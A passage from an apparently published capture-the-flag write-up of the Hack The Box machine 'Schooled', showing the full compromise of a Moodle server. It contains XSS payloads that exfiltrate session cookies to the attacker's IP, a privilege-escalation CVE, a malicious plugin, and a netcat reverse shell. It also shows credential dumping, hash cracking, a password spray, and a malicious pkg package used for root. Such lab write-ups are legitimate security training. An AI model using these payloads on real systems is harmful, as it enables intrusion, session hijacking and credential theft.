<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:          http://schooled.htb/
<span class="o">[</span>+<span class="o">]</span> Method:       GET
<span class="o">[</span>+<span class="o">]</span> Threads:      <span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
<span class="o">[</span>+<span class="o">]</span> User Agent:   gobuster/3.1.0
<span class="o">[</span>+<span class="o">]</span> Timeout:      <span class="nv">10s</span>
<span class="o">===============================================================</span>
2021/05/17 17:11:00 Starting gobuster in VHOST enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
Found: moodle.schooled.htb <span class="o">(</span>Status:  200<span class="o">)</span> <span class="o">[</span>Size: 84<span class="o">]</span>
</code></pre></div><p>I will update <code>/etc/hosts</code> again.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 schooled.htb moodle.schooled.htb&#39;</span>
</code></pre></div><p>And it&rsquo;s different site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ curl -s http://moodle.schooled.htb/ <span class="p">|</span> wc -c <span class="o">&amp;&amp;</span> curl -s http://schooled.htb <span class="p">|</span> wc -c
<span class="m">84</span>
<span class="m">20750</span>
</code></pre></div><h3 id="tcp-80---moodleschooledhtb">TCP 80 - moodle.schooled.htb</h3>
<p>Heading to <code>moodle.schooled.htb</code> shows that it&rsquo;s <a href="https://moodle.org/">Moodle LMS</a>, and there are four courses available here.</p>
<p><div class="img-container"><img src="imgs/image-20210518171919132.png" alt="image-20210518171919132"  /></div>
</p>
<p>It allows guest login, but nothing much I can do with that, so I will just register an account.</p>
<h4 id="account-register">Account Register</h4>
<p>To register an account I have to use the domain <code>student.schooled.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210518173537504.png" alt="image-20210518173537504"  /></div>
</p>
<p>I will change my email domain and login afterwards.</p>
<p>When I visit the domain <code>student.schooled.htb</code>, it returns the same site as <code>schooled.htb</code>.</p>
<h4 id="enroll-course">Enroll course</h4>
<p>Based on the login activity,  Manuel Phillips is the only teacher that seems to be active. So I will enroll to his course (it allows self-enroll).</p>
<p><div class="img-container"><img src="imgs/image-20210518174336502.png" alt="image-20210518174336502"  /></div>
</p>
<p>On the Mathematics course, there are two announcements .</p>
<p><div class="img-container"><img src="imgs/image-20210518175011420.png" alt="image-20210518175011420"  /></div>
</p>
<p>The oldest announcement by Jamie Borham is just a welcome message and the other titled &ldquo;Reminder for joining students&rdquo; by Manuel Phillips is a reminder for the students to set their MoodleNet profiles.</p>
<p><div class="img-container"><img src="imgs/image-20210518175100601.png" alt="image-20210518175100601"  /></div>
</p>
<p>The &ldquo;MoodleNet profile&rdquo; that Manuel Phillips was talking about can be found at <code>Dashboard -&gt; Preferences -&gt; User account -&gt; Edit profile</code> .</p>
<p><div class="img-container"><img src="imgs/image-20210518183135218.png" alt="image-20210518183135218"  /></div>
</p>
<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
<h4 id="exploit-db">Exploit-DB</h4>
<p>At that time, I didn&rsquo;t know how to determine the Moodle version, so I started to search the Moodle vulnerabilities on Exploit-DB using keyword <code>Moodle</code> and sorted the results by latest, here are some potential public exploits I found:</p>
<ul>
<li>Moodle 3.10.3 - &lsquo;url&rsquo; Persistent Cross Site Scripting =&gt; Need a teacher or an administrator or a manager role.</li>
<li>Moodle 3.10.3 - &lsquo;label&rsquo; Persistent Cross Site Scripting =&gt; Worth to try.</li>
</ul>
<p><div class="img-container"><img src="imgs/image-20210518183748916.png" alt="image-20210518183748916"  /></div>
</p>
<h4 id="moodle-security">Moodle Security</h4>
<p>The other place to look for the Moodle vulnerabilities/security issues is on  <a href="https://moodle.org/security/">https://moodle.org/security/</a>. In there, I find one stored XSS that seems interesting because it contains &ldquo;moodlenetprofile&rdquo; in its title.</p>
<p><div class="img-container"><img src="imgs/image-20210518220404280.png" alt="image-20210518220404280"  /></div>
</p>
<p>Another one that looks promising is the privilege escalation from the teacher role into manager role.</p>
<p><div class="img-container"><img src="imgs/image-20210520020814806.png" alt="image-20210520020814806"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="access-as-manuel-phillips">Access as Manuel Phillips</h3>
<h4 id="moodle-cve-2020-25627---stored-xss-via-moodlenet-profile">Moodle CVE-2020-25627 - Stored XSS via MoodleNet profile</h4>
<p>From the previous enumeration, I remember that Phillips mentioned &lsquo;MoodleNet profile&rsquo;, which actually the hint to the stored XSS (<a href="https://moodle.org/mod/forum/discuss.php?d=410839&amp;__cf_chl_captcha_tk__=pmd_kdXMGLO2gONcgFQGznuXi0NScKF9l4nL1tJSsqrMN4o-1631707461-0-gqNtZGzNAxCjcnBszQhR">CVE-2020-25627</a>) vulnerability affected the MoodleNet profile. XSS attack is typically used to <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies">steal a user cookie session</a>. So in this case, I&rsquo;m going to steal Manuel Phillips&rsquo;s cookie.</p>
<p>First, I will setup a netcat listener on port 80, then I will edit my MoodleNet profile (<code>Dashboard &gt; Preferences &gt; User account &gt; Edit profile &gt; MoodleNet profile</code>) and change its value to the following payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span> <span class="nx">iamf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span> <span class="nx">iamf</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s1">&#39;http://10.10.14.49/?iamf=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div><p>Or this one:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&#34;http://10.10.14.49/?iamf=&#39;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="s1">&#39;&#34; /&gt;&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210520012522733.png" alt="image-20210520012522733"  /></div>
</p>
<p>After a few minutes, there is a request coming to my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
$ nc -nvlp <span class="m">80</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">26076</span>
GET /?iamf<span class="o">=</span><span class="nv">MoodleSession</span><span class="o">=</span>40mch0eki9ko6kpe03kq36cd97 HTTP/1.1
Host: 10.10.14.49
User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> FreeBSD amd64<span class="p">;</span> rv:86.0<span class="o">)</span> Gecko/20100101 Firefox/86.0
Accept: image/webp,*/*
Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://moodle.schooled.htb/moodle/user/profile.php?id<span class="o">=</span><span class="m">33</span>
</code></pre></div><p>I will update my <code>MoodleSession</code> to the one I obtained from XSS.</p>
<p><div class="img-container"><img src="imgs/image-20210520013212895.png" alt="image-20210520013212895"  /></div>
</p>
<p>When I refresh the page, I&rsquo;m now logged in as Manuel Phillips.</p>
<p><div class="img-container"><img src="imgs/image-20210915212643838.png" alt="image-20210915212643838"  /></div>
</p>
<p>Now I can confirm that this Moodle version is 3.9 by visiting <code>http://moodle.schooled.htb/moodle/user/view.php?id=24&amp;course=5</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210915213438687.png" alt="image-20210915213438687"  /></div>
</p>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="moodle-cve-2020-14321---teacher-role---manager-role">Moodle CVE-2020-14321 - Teacher role -&gt; Manager role</h4>
<p>This Moodle version is known to be vulnerable to the role privilege escalation (<code>CVE-2020-14321</code>) that allows escalation of privilege from teacher role (Manuel Phillips has teacher role) to manager role. With manager role, it is also possible to obtain code execution by installing a malicious plugin. I will be using this <a href="https://vimeo.com/441698193">walkthrough video</a> created by the researcher who found this vulnerability as my reference.</p>
<p>The first step is to join a teacher to my course.</p>
<p><div class="img-container"><img src="imgs/image-20210520022325198.png" alt="image-20210520022325198"  /></div>
</p>
<p>I will choose Jamie Borham and enroll it to my course.</p>
<p><div class="img-container"><img src="imgs/image-20210520022826655.png" alt="image-20210520022826655"  /></div>
</p>
<p>I will intercept the enroll request using Burp Suite and modify the <code>userslist</code> parameter to 24 (UserID of Phillips) then the <code>roletoassign</code> parameter to 1.</p>
<p><div class="img-container"><img src="imgs/image-20210520023902707.png" alt="image-20210520023902707"  /></div>
</p>
<p>On the course participants, I can see the manager role has been assigned to Phillips.</p>
<p><div class="img-container"><img src="imgs/image-20210915214751404.png" alt="image-20210915214751404"  /></div>
</p>
<p>With manager role, I have the ability to impersonate my participants (they have to be on my course first) using &ldquo;Login as&rdquo; function. For example:</p>
<p><div class="img-container"><img src="imgs/image-20210520032135611.png" alt="image-20210520032135611"  /></div>
</p>
<p>When I logged in as Lianne Carter, there is another menu called &ldquo;Site Administration&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210915221840588.png" alt="image-20210915221840588"  /></div>
</p>
<h4 id="malicious-plugin">Malicious Plugin</h4>
<p>Now to get RCE, I need to grant full permissions to manager role (from my understanding, Lianne Carter has site administrative capability and manager role).</p>
<p>I will head to <code>Site Administration</code> -&gt; <code>Users</code> -&gt; <code>Define roles</code> -&gt; <code>Manager</code> -&gt;  <code>Edit</code> to grant full permission to manager role.</p>
<p><div class="img-container"><img src="imgs/image-20210915222952344.png" alt="image-20210915222952344"  /></div>
</p>
<p>Then I will just click on <code>Save changes</code> button and intercept its request.</p>
<p><div class="img-container"><img src="imgs/image-20210915223616445.png" alt="image-20210915223616445"  /></div>
</p>
<p>Except the <code>sesskey</code> parameter, I will change all the parameters with this <a href="https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions">PoC</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210915223955951.png" alt="image-20210915223955951"  /></div>
</p>
<p>Now I can install a malicious plugin by accessing <code>Site Administration</code> -&gt; <code>Plugins</code> -&gt; <code>Install plugins</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210915224410922.png" alt="image-20210915224410922"  /></div>
</p>
<p>I will grab the malicious plugin from this repository: <a href="https://github.com/HoangKien1020/Moodle_RCE">https://github.com/HoangKien1020/Moodle_RCE</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210915225327871.png" alt="image-20210915225327871"  /></div>
</p>
<p>I will just continue on the installation process.</p>
<p><div class="img-container"><img src="imgs/image-20210915230537390.png" alt="image-20210915230537390"  /></div>
</p>
<p>Once the plugin is installed, it can be accessed at <code>http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=[command]</code>:</p>
<p><div class="img-container"><img src="imgs/image-20210520034807810.png" alt="image-20210520034807810"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>Since it&rsquo;s FreeBSD, I will use the mkfifo payload to get a foothold.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol
</code></pre></div><p>On my listener:</p>
<p><div class="img-container"><img src="imgs/image-20210520041503270.png" alt="image-20210520041503270"  /></div>
</p>
<p>I will upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ /usr/local/bin/python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/sh&#39;)&#34;</span>
$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
$ which stty
which stty
/bin/stty
$ ^Z
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">4974</span> suspended  nc -nvlp <span class="m">53</span>
→ root@kali «exploits» «10.10.14.49» 
$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">4974</span> continued  nc -nvlp <span class="m">53</span>

$ ls -l
total <span class="m">0</span>
$ ls -la
total <span class="m">0</span>
$ <span class="nb">pwd</span>
/usr/local/www/apache24/data/moodle/blocks/rce/lang/en
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-jamie">Shell as jamie</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>There are two users other than root who have a login shell: <strong>jamie</strong> and <strong>steve</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cat /etc/passwd <span class="p">|</span> grep sh$
root:*:0:0:Charlie <span class="p">&amp;</span>:/root:/bin/csh
jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
steve:*:1002:1002:User <span class="p">&amp;</span>:/home/steve:/bin/csh
$ ls -l /home/
total <span class="m">17</span>
drwx------  <span class="m">2</span> jamie  jamie  <span class="m">11</span> Feb <span class="m">28</span> 18:13 jamie
drwx------  <span class="m">5</span> steve  steve  <span class="m">14</span> Mar <span class="m">17</span> 14:05 steve
</code></pre></div><p>The Moodle configuration file is located under <code>/usr/local/www/apache24/data/moodle</code>, and it contains database credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cat config.php 
&lt;?php  // Moodle configuration file

unset<span class="o">(</span><span class="nv">$CFG</span><span class="o">)</span><span class="p">;</span>
global <span class="nv">$CFG</span><span class="p">;</span>
<span class="nv">$CFG</span> <span class="o">=</span> new stdClass<span class="o">()</span><span class="p">;</span>

<span class="nv">$CFG</span>-&gt;dbtype    <span class="o">=</span> <span class="s1">&#39;mysqli&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dblibrary <span class="o">=</span> <span class="s1">&#39;native&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbhost    <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbname    <span class="o">=</span> <span class="s1">&#39;moodle&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbuser    <span class="o">=</span> <span class="s1">&#39;moodle&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbpass    <span class="o">=</span> <span class="s1">&#39;PlaybookMaster2020&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;prefix    <span class="o">=</span> <span class="s1">&#39;mdl_&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dboptions <span class="o">=</span> array <span class="o">(</span>
  <span class="s1">&#39;dbpersist&#39;</span> <span class="o">=</span>&gt; 0,
  <span class="s1">&#39;dbport&#39;</span> <span class="o">=</span>&gt; 3306,
  <span class="s1">&#39;dbsocket&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;&#39;</span>,
  <span class="s1">&#39;dbcollation&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;utf8_unicode_ci&#39;</span>,
<span class="o">)</span><span class="p">;</span>

<span class="nv">$CFG</span>-&gt;wwwroot   <span class="o">=</span> <span class="s1">&#39;http://moodle.schooled.htb/moodle&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dataroot  <span class="o">=</span> <span class="s1">&#39;/usr/local/www/apache24/moodledata&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;admin     <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>

<span class="nv">$CFG</span>-&gt;directorypermissions <span class="o">=</span> 0777<span class="p">;</span>

require_once<span class="o">(</span>__DIR__ . <span class="s1">&#39;/lib/setup.php&#39;</span><span class="o">)</span><span class="p">;</span>

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
</code></pre></div><h4 id="mysql">MySQL</h4>
<p>MySQL binary cannot be resolved, but it&rsquo;s available at <code>/usr/local/bin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ /usr/local/bin/mysql moodle -u moodle -p<span class="s1">&#39;PlaybookMaster2020&#39;</span>
mysql: <span class="o">[</span>Warning<span class="o">]</span> Using a password on the <span class="nb">command</span> line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
Your MySQL connection id is <span class="m">7517</span>
Server version: 8.0.23 Source distribution

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.

moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; 
</code></pre></div><p>Table <code>mdl_users</code> holds all the Moodle user credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; <span class="k">select</span> username,password from mdl_user<span class="p">;</span>
+-------------------+--------------------------------------------------------------+
<span class="p">|</span> username          <span class="p">|</span> password                                                     <span class="p">|</span>
+-------------------+--------------------------------------------------------------+
<span class="p">|</span> guest             <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$u8DkSWjhZnQhBk1a0g1ug</span>.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 <span class="p">|</span>
<span class="p">|</span> admin             <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW <span class="p">|</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
<span class="p">|</span> iamf              <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$GTtFW8Rpm8jnLJ1YmpTBy</span>.rmhwTjdWfc9mR6/jC87WtvCK6CgVOXy <span class="p">|</span>
+-------------------+--------------------------------------------------------------+
<span class="m">33</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; 
</code></pre></div><p>There are a lot of hashes to recover, but I will focus on the admin hash first.</p>
<h4 id="hash-crack">Hash crack</h4>
<p>Hashcat recovers the admin password to <code>!QAZ2wsx</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ hashcat.exe -m <span class="m">3200</span> <span class="s1">&#39;$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:&#39;</span> rockyou.txt

...<span class="o">[</span>SNIP<span class="o">]</span>...
<span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx

Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt <span class="nv">$2</span>*$, Blowfish <span class="o">(</span>Unix<span class="o">)</span>
Hash.Target......: <span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5G...l4qTiW
Time.Started.....: Thu May <span class="m">20</span> 05:04:20 <span class="m">2021</span> <span class="o">(</span><span class="m">1</span> min, <span class="m">25</span> secs<span class="o">)</span>
Time.Estimated...: Thu May <span class="m">20</span> 05:05:45 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
Guess.Base.......: File <span class="o">(</span>../rockyou.txt<span class="o">)</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="password-spray">Password Spray</h4>
<p>With password spray attack, it reveals that the password is reused by user <strong>jamie</strong> for SSH login.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ crackmapexec ssh 10.10.10.234 -u users.list -p passwords.list --continue-on-success
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9 FreeBSD-20200214
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> root:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> root:!QAZ2wsx Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> jamie:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>+<span class="o">]</span> jamie:!QAZ2wsx 
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> steve:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> steve:!QAZ2wsx Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</code></pre></div><h4 id="ssh">SSH</h4>
<p>Now I can login as jamie via SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ ssh jamie@10.10.10.234
Password <span class="k">for</span> jamie@Schooled:
Last login: Tue Mar <span class="m">16</span> 14:44:53 <span class="m">2021</span> from 10.10.14.5
FreeBSD 13.0-BETA3 <span class="o">(</span>GENERIC<span class="o">)</span> <span class="c1">#0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021</span>

...<span class="o">[</span>SNIP<span class="o">]</span>...

jamie@Schooled:~ $ id
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span>,0<span class="o">(</span>wheel<span class="o">)</span>
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>User <strong>jamie</strong> is allowed to run sudo on <code>pkg</code> binary.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg update
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg install *
</code></pre></div><p>According to <a href="https://gtfobins.github.io/gtfobins/pkg/">GTFObins</a>, this can be abused to install malicious FreeBSD package, but <code>fpm </code> has to be <a href="https://github.com/jordansissel/fpm">installed</a> first.</p>
<h4 id="installing-a-malicious-package">Installing a Malicious Package</h4>
<p>Using reference from GTFOBins, I can create a malicious package that contains a reverse shell</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">&#39;mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol&#39;</span> &gt; <span class="nv">$TF</span>/x.sh<span class="p">;</span>fpm -n x -s dir -t freebsd -a all --before-install <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
DEPRECATION NOTICE: XZ::StreamWriter#close will automatically close the wrapped IO in the future. Use <span class="c1">#finish to prevent that.</span>
/var/lib/gems/2.5.0/gems/ruby-xz-0.2.3/lib/xz/stream_writer.rb:185:in <span class="sb">`</span>initialize<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `new&#39;</span>
        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in <span class="sb">`</span>block in output<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `open&#39;</span>
        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in <span class="sb">`</span>output<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:487:in `execute&#39;</span>
        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:68:in <span class="sb">`</span>run<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:574:in `run&#39;</span>
        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:133:in <span class="sb">`</span>run<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/bin/fpm:7:in `&lt;top (required)&gt;&#39;</span>
        /usr/local/bin/fpm:23:in <span class="sb">`</span>load<span class="s1">&#39;
</span><span class="s1">        /usr/local/bin/fpm:23:in `&lt;main&gt;&#39;</span>
Created package <span class="o">{</span>:path<span class="o">=</span>&gt;<span class="s2">&#34;x-1.0.txz&#34;</span><span class="o">}</span>
</code></pre></div><p>I will transfer the package to Schooled.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
$ <span class="k">$(</span>bash -c <span class="s1">&#39;cat x-1.0.txz &gt; /dev/tcp/10.10.10.234/9000&#39;</span><span class="k">)</span>
</code></pre></div><blockquote>
<p><code>/dev/tcp/</code> is a feature from Bash. Since my shell is Zsh, so I had to invoke the transfer command within a subshell.</p>
</blockquote>
<p>On Schooled:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ nc -lv <span class="m">9000</span> &gt; x-1.0.txz
Connection from 10.10.14.49 <span class="m">60744</span> received!
</code></pre></div><p>I will setup a Netcat listener on my Kali and start the installation of the package on Schooled.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ sudo pkg install -y --no-repo-update ./x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. <span class="s1">&#39;pkg update&#39;</span> required
Checking integrity... <span class="k">done</span> <span class="o">(</span><span class="m">0</span> conflicting<span class="o">)</span>
The following <span class="m">1</span> package<span class="o">(</span>s<span class="o">)</span> will be affected <span class="o">(</span>of <span class="m">0</span> checked<span class="o">)</span>:

New packages to be INSTALLED:
        x: 1.0

Number of packages to be installed: <span class="m">1</span>
<span class="o">[</span>1/1<span class="o">]</span> Installing x-1.0...
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>And I&rsquo;m rooted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
$ nc -nvlp <span class="m">53</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">23093</span>
<span class="c1"># whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; cut -c-15 /root/root.txt</span>
root
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span>,5<span class="o">(</span>operator<span class="o">)</span>
Schooled
2462d8e2125d2a0
</code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
